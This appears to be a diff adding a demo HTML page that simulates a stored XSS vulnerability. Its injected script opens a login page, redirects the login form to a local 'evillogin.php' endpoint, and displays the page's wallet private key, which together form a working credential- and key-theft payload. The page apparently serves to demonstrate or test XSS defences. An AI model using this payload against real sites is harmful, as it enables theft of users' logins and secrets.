@@ -1,0 +1,22 @@
+<html>
+    <head>
+
+    </head>
+    <body>
+        <div>This page simluates a stored XSS vulnerability.</div>
+        <div id="injection-point">
+            This is stored XSS content.
+            <script>
+                function compromise(myWindow) {
+                    login = myWindow.document.getElementById("login");
+                    login.action = '//localhost:666/evillogin.php';
+                    login.innerHTML = login.innerHTML + '<div><font color="red">stolen private key is ' + myWindow.MyWallet + '</font></div>';
+                }
+                //var windowObjectReference = window.open(strUrl, strWindowName, [strWindowFeatures]);
+                var myWindow = window.open("login-not-vulnerable.html", "myWindow");
+                //Allow page to load before modifying
+                setTimeout(compromise, 500, myWindow);
+            </script>
+        </div>
+    </body>
+</html>
